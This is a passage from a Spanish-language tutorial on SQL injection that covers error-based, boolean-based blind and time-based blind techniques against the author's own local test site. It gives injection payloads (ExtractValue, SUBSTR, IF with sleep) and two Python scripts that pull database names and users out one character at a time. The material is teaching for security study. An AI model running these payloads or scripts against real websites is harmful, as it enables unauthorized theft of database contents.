Esta función nos permite concatenar diversas palabras y caracteres, incluidas columnas. De esta forma estamos obteniendo dos columnas en el campo de una.

Este procedimiento sería el que habría que hacer en gestores como MariaDB o MySQL. Para ver como sería en otros gestores lo mejores es buscar cheatsheets de cada uno:

- _[Cheatsheet de SQL Injection para MS-SQL en pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)_
- _[Cheatsheet de SQL Injection para Oracle en pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)_

##### Error-based

Habiendo acabado con el Union-based es hora de ver el Error-based. Este tipo de SQL Injection consiste en ocasionar a propósito un error en el servidor, de tal forma, que en esta respuesta, consigamos resultados de la base de datos.

Pongámonos en el ejemplo de que el servidor no devuelve los resultados de las peticiones a la base de datos, esto podría tratarse de un SQL Blind como veremos más adelante, pero por comodidad nuestra, lo mejor sería poder ver los resultados en esta respuesta del servidor. Por lo que, lo que podemos probar es ocasionar un error en el servidor para que si se da el caso, el servidor si muestre en su respuesta este error, y dentro de este error, el resultado de una sentencia SQL que nosotros le digamos.

Quedará más claro ahora cuando lo veamos.

Lo que hay que dejar claro, es que existen multitud de formas para generar errores, por lo que la que veremos es solo una forma de las muchas que hay. Además, cambiará dependiendo del gestor que se esté usando.

En MySQL/MariaDB podemos usar la siguiente sentencia:

- AND ExtractValue('',Concat('=',(<SENTENCIA SQL>)))

![Error-based SQL Injection extrayendo usuario mediante ExtractValue](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-43.avif)

En este caso, a través de un error, estamos consiguiendo mostrar el primer nombre de usuario de la tabla users.

> Ojo, aquí ya no ocurre que la sentencia SQL que ejecutamos está en conjunto con la sentencia SQL del servidor, en el sentido de que tenemos que hacer uso de UNION. Ya que esta sentencia (SELECT user FROM users LIMIT 0,1) de la imagen, va totalmente aparte.
> 
> Porque la sentencia que si va en conjunto con la del servidor, es la que causa el propio error.

Aquí vamos a aprovechar para introducir otro concepto, y son las funciones. Que, ya hemos visto algunas como puede ser CONCAT(). Pero existen otras funciones las cuales nos pueden devolver información del gestor SQL, el usuario que ejecuta el gestor, etc. Por ejemplo:

- @@version --> En MySQL y MariaDB, nos devuelve la versión del gestor de base de datos.

![Extracción de versión de MySQL usando @@version](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-44.avif)

Otra función puede ser user():

![Extracción de usuario actual usando función user()](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-45.avif)

Este tipo de funciones también las podemos usar en las demás inyecciones SQL, ya que son propias del gestor de bases de datos.

En cualquier caso, todas estas funciones o formas de ocasionar errores en el servidor, como hemos dicho, la forma en la que se haga o sea, dependerá mucho del gestor de base de datos, por lo que lo mejor es mirar una cheatsheet del gestor con el que estemos lidiando (aunque si es cierto que muchas funciones si son iguales y coinciden en varios gestores).

## Blind SQL Injection

Ya hemos visto los casos de inyecciones SQL donde somos capaces de ver los resultados en la respuesta web del servidor. Ahora bien, habrá ocasiones donde el servidor no devuelva absolutamente nada, y, aun así, sí que sea vulnerable a SQL Injection, estos son los denominados Blind (también conocidos como Inferential).

Ante esta situación, se puede proceder de dos formas distintas, dicho de otra forma, hay dos tipos de SQL Blind:

- Boolean-Based
- Time-Based

Vamos a ver los dos, pero, antes que nada, vamos a hacer el siguiente cambio en el código de nuestra web:

![Código PHP original antes de comentar para Blind SQL](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-46.avif)

Vamos a comentarlo todo para que la web no muestre ninguna respuesta, además, añadiremos una frase que nos indique cuando la petición es correcta y cuando no:

![Código PHP modificado sin mostrar resultados](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-47.avif)

![Mensaje indicando petición exitosa sin mostrar datos](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-48.avif)

##### Boolean-Based

Esta técnica es la misma que hemos visto al principio del post, por el cual, dependiendo de la respuesta del servidor, podíamos detectar si habia un SQL Injection o no:

![Boolean-based con condición falsa AND 2=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-49.avif)

![Boolean-based con condición verdadera AND 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-50.avif)

Sin embargo, antes no hemos visto de lo que es capaz esta técnica. Parecerá una tontería, pero el hecho de que la respuesta del servidor cambie dependiendo de una condición booleana (True or False) puede determinar que podamos conseguir toda la información que queramos de la base de datos.

Esto es porque podemos hacer uso, de la siguiente función:

- SUBSTR(<SENTENCIA SQL o FUNCION>, <Offset>, <cantidad (lo dejamos en 1)>)

Básicamente, con esta función podemos ejecutar ya sea una sentencia SQL o una función y limitar el resultado a 1 carácter, teniendo la posibilidad de elegir la posición del carácter proveniente del resultado (offset).

Sabiendo esto, suponiendo que por ejemplo, queremos obtener el nombre de la base de datos que se está usando, podemos crear una condición como la siguiente:

- 1 AND SUBSTR(database(), 1, 1)='a'#

Nosotros ya sabemos que la base de datos es webserver, por lo que vamos a ver el comportamiento del servidor ante esta condición:

![Prueba de SUBSTR con letra incorrecta 'a' sin resultado](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-51.avif)

Como la base de datos es webserver, el resultado de la función SUBSTR(database(), 1, 1) será w.

De forma iterada, el resultado de la función SUBSTR(database(), 2, 1) será e.

- SUBSTR(database(), 3, 1) será b.

- SUBSTR(database(), 4, 1) será s.

- etc etc.

Entendiendo ya como funciona, por ejemplo, vamos a cambiar la 'a' por la 'w' (que ya sabemos que es la primera letra del nombre de la base de datos) para ver la respuesta del servidor:

![Prueba de SUBSTR con letra correcta 'w' mostrando éxito](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-52.avif)

Con esto, nos damos cuenta que cuando las letras son iguales, el servidor devolverá en la respuesta: "La petición se ha realizado con éxito". Por lo que, con estos datos, podemos hacernos un script que vaya iterando por todo el abecedario y que vaya obteniendo las respuestas del servidor y analizándolas, comprobando que:

- En el caso de que el servidor devuelva "La petición se ha realizado con éxito". Significará que la letra por la cual hayamos iterado es la correcta.
- Si no devuelve esa frase, pues, siguiente letra.

En este caso he montado el siguiente script en python3:

```python
#!/usr/bin/python3

import requests
import sys

mayusc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
minusc = mayusc.lower()
numbers = '1234567890'
simbols = '|@#~!"·$%&/()=:.-_,; <>[]{}?\r\n'

dictionary = minusc + mayusc + numbers + simbols

def booleanSQL():

        global info
        info = ''

        for i in range(1,100):

                stop = False

                for j in dictionary:

                        response = requests.get("http://localhost/books.php?id=1 AND SUBSTR(database(), %d, 1)='%s'#" % (i, j))

                        if 'La peticion se ha realizado' in response.text:

                                print("La letra numero %d es %s" % (i, j))

                                info += j

                                stop = False

                                break

                        stop = True

                if stop:
                        break

if __name__ == '__main__':

        booleanSQL()

        print("\nLa base de datos se llama %s" % info)
```

Ejecutando este script, ocurre la magia:

![Script Python enumerando base de datos con Boolean-based](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-53.avif)

Conseguimos enumerar información en base a como cambia la respuesta del servidor dependiendo de la condición booleana.

Ya podemos enumerar cualquier cosa, solo tendríamos que cambiar la query de la petición:

![Modificación del script para extraer usuarios](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-54.avif)

![Resultado del script extrayendo primer usuario](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-55.avif)

> Por ejemplo, en este caso, la query SELECT user FROM users devuelve más de un resultado, por lo que para poder enumerar, deberemos de limitar el resultado a 1 usando LIMIT. En este caso podríamos hacer otro bucle for que itere por LIMIT para que vaya obteniendo los resultados de cada fila.

Otro ejemplo:

![Script modificado para extraer versión con @@version](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-56.avif)

![Resultado del script mostrando versión de MariaDB](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-57.avif)

Y así, con las técnicas que hemos visto a lo largo de todo el post, ya podríamos enumerar todo.

##### Time-Based

Las inyecciones SQL Blind basadas en tiempo, en concepto son iguales que las basadas en booleanos. Solo que en este caso, el servidor no devuelve ningún cambio en la respuesta sin importar la condición.

Vamos a comentar la siguiente parte del código para que sea así:

![Código PHP completamente comentado sin respuesta diferenciada](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-58.avif)

De esta forma, no hay manera de diferenciar:

![Respuesta idéntica con condición falsa 2=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-59.avif)

![Respuesta idéntica con condición verdadera 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-60.avif)

¿Qué hacemos entonces?

Pues, hay una instrucción la cual es sleep() (es así en el caso de MySQL/MariaDB, puede variar dependiendo del gestor, asi que como siempre, lo mejor es mirarse una cheatsheet). Esta instrucción como te puedes imaginar hará una pausa de tiempo de los segundos que indiques, por ejemplo, sleep(5) hará una pausa de 5 segundos.

Pues, con esta instrucción, la idea es muy similar al Boolean-Based, nos podemos construir una sentencia como la siguiente:

- 1 AND IF((SUBSTR(database(), 1, 1)='a'), sleep(5), 1)#

En este caso estamos haciendo uso de IF, la cual tiene la siguiente estructura:

- IF(<condicion>, <si es verdad se ejecuta esto>, <si no es verdad se ejecuta esto>)

Como tal, la sentencia que tenemos colocada en la condición del IF, es exactamente la misma que la del Boolean-Based. Sabemos que esta sentencia dará TRUE si la letra coincide y FALSE si no.

Por lo que, si es TRUE (coincide la letra), se ejecutará la instrucción sleep(5), que hará que el servidor tarde 5 segundos en responder, de lo contrario, no hará nada.

Con todo esto, es realmente sencillo, si el servidor tarda 5 segundos en responder significa que la letra que hayamos puesto coincide. Ejemplo:

![Navegador mostrando retraso de 5 segundos con sleep](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-61.avif)

La web se quedará cargando 5 segundos, ya que la primera letra del nombre de la base de datos es una w.

Por lo que, nos podemos hacer un script que determine que letras son las correctas en base a cuanto tiempo tarda el servidor en responder:

```python
#!/usr/bin/python3

import requests
import sys
import time

mayusc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
minusc = mayusc.lower()
numbers = '1234567890'
simbols = '|@#~!"·$%&/()=:.-_,; <>[]{}?\r\n'

dictionary = minusc + mayusc + numbers + simbols

def check(offset, letter):

    time_start = time.time()
    response = requests.get("http://localhost/books.php?id=1 AND IF((SUBSTR(database(), %d, 1)='%s'), sleep(5), 1)#" % (offset, letter))
    time_end = time.time()

    if time_end - time_start > 5:
        return 1

def timeSQL():

    global info
    info = ''

    for i in range(1,100):

        stop = False

        for j in dictionary:

            if check(i, j):

                print("La letra numero %d es %s" % (i, j))

                info += j

                stop = False

                break

            stop = True

        if stop:
            break

if __name__ == '__main__':

    timeSQL()

    print("\nEl nombre de la base de datos es %s" % info)
```

Ejecutando el script pues mirad que bonito:

![Script Python ejecutándose con Time-based SQL Injection](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-62.avif)

Nos va extrayendo el nombre poco a poco, todo en base al tiempo que tarda el servidor en responder:

![Resultado completo del script Time-based mostrando webserver](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-63.avif)

Mirad como coincide, webserver tiene 9 letras, y le hemos indicado un sleep de 5 segundos, pues 9x5 = 45 que es justamente el tiempo que ha tardado el script (podría demorarse algún que otro segundo más dependiendo del caso, pero no mucho).

Y ya, pues igual que lo que hemos hecho con el Boolean-Based, iríamos cambiando la sentencia SQL para obtener la información que queramos:

![Script modificado para extraer usuario con Time-based](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-64.avif)

![Resultado del script Time-based extrayendo usuario admin](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-65.avif)

Y esto básicamente sería un SQL Blind basado en tiempo.

## Out-of-Band

Por último y no menos importantes, SQL Injection Out-of-Band. Este SQL Injection en esencia es el mismo que el Blind, ya que el servidor no devuelve en la respuesta ninguna información del resultado de la sentencia SQL. Sin embargo, cuando nos referimos a Out-of-Band, queremos decir que quizás tenemos la posibilidad de exfiltrar la información a un servidor remoto.

No es distinto en cuanto a las sentencias SQL y técnicas que hemos visto a lo largo de este post. La única diferencia es la ya mencionada, que quizás somos capaces de exfiltrar/enviar las respuestas a un servidor controlado por nosotros y, de esta forma, poder obtener y leer los resultados de las consultas hechas.

Esta técnica es más avanzada y se le puede dedicar un post completo, por lo que la veremos en otro momento. Sin embargo, es suficiente con que te quedes con que existe y su finalidad.

## Conclusión

Hemos visto muchos conceptos y detalles en este post. Para acabar simplemente me gustaría dar algunos detalles:

- Todas las sentencias SQL deben de acabar con ;, en las imágenes que ejecutábamos las sentencias en la terminal podrás ver como siempre se ponía. Con esto digo, que también puede ser buena práctica acabar nuestras inyecciones con ; además del ya dicho, instrucción de comentario --> ;#
- Típicamente, en el SQL Injection se suelen usar comillas simples, pero este no siempre será el caso, al final dependerá de que comillas esté usando el servidor por detrás. Por lo que tenemos que ir alternando en caso de que una no funcione para ver si la otra si lo hace.
    - Es decir, si por ejemplo en una sentencia, el campo en el que nosotros introducimos en el código está rodeado por:
        - "<valor que nosotros controlamos>"
    - Pues, aunque la comilla simple si generará un fallo y quizás podamos ver un error de SQL, a la hora de hacer por ejemplo esto:
        - "" OR 1=1#"
    - Sí que tendremos que usar una comilla doble.
- Los SQLi no se limitan a peticiones del tipo GET, realmente puede ocurrir en cualquier campo en el que introducimos datos, ya sea POST o GET.

Todo esto que acabo de mencionar simplemente son detalles que está bien que conozcas de cara a poder pensar formas de hacer inyecciones SQL.

## Referencias

- _[Guía de comandos SQL en Guru99: DML, DDL, DCL, TCL, DQL con ejemplos](https://www.guru99.com/sql-commands-dbms-query.html#4)_
- _[Cheatsheet de MySQL en devhints.io](https://devhints.io/mysql)_
- _[Fundamentos de las bases de datos NoSQL en MongoDB](https://www.mongodb.com/es/nosql-explained)_
- _[Explotación de SQL Injection Error-based en Akimbo Core](https://akimbocore.com/article/sql-injection-exploitation-error-based/)_
- _[Cheatsheet práctico de MySQL SQL Injection en Perspective Risk](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)_
- _[Curso de SQL Injection en HackTheBox Academy](https://academy.hackthebox.eu/)_
- _[Curso de Web Application Penetration Testing en INE](https://my.ine.com/INE/courses/38316560/web-application-penetration-testing)_
